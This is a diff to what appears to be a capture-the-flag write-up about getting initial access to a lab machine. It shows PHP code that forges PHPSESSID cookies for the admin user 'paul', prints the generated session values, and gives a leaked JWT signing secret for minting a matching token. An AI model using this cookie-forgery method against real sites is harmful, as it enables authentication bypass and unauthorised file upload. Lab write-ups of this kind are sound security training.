@@ -1,7 +1,7 @@
 # Getting initial reverse shell as www-data
 ## Generating cookie for paul as admin user to upload files
-Source code for generating cookie is.
-Note: Only paul as admin user can upload files and access file upload page.
+Note: Only paul as admin user can upload files and access file upload page. Cookie is composed of two portions `PHPSESSID` and `JWT Token`.
+Source code for generating `PHPSESSID` portion of  cookie is.
 ```php
 <?php
 \/**
@@ -22,7 +22,7 @@ function makesession($username){
     return $session_cookie;
 }
 ```
-We can write php script to generate cookies for paul.
+We can write php script to generate `PHPSESSID` portion of cookie for paul.
 ```php
 <?php
 $name = "paul";
@@ -37,4 +37,13 @@ for($i = 0;$i < strlen($name); $i++){
     echo makesession($name,$i). "\xA";
 }
 ```
-Which gives following cookies.
+Which gives following `PHPSESSID`.
+```bash
+paula2a6a014d3bee04d7df8d5837d62e8c5
+paul61ff9d4aaefe6bdf45681678ba89ff9d
+paul8c8808867b53c49777fe5559164708c3
+paul47200b180ccd6835d25d034eeb6e6390
+```
+We also need JWT token as paul cookie which can be generated via following website having secret key as `6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e`(found in `portal/includes/filecontroller.php`). Webiste for generating [JWT Token](https://jwt.io/).
+![[Pasted image 20210730114707.png]]
+# Logging in as  paul admin and accessing file upload page
